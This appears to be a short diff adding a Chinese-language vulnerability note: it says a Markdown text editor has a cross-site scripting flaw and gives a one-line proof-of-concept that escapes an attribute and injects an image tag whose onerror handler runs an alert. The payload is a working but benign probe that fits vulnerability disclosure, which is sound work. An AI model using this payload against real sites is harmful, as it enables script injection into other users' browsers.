@@ -1,0 +1,3 @@
+ 在md文本编辑器中存在的xss漏洞。
+ poc如下：
+ "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
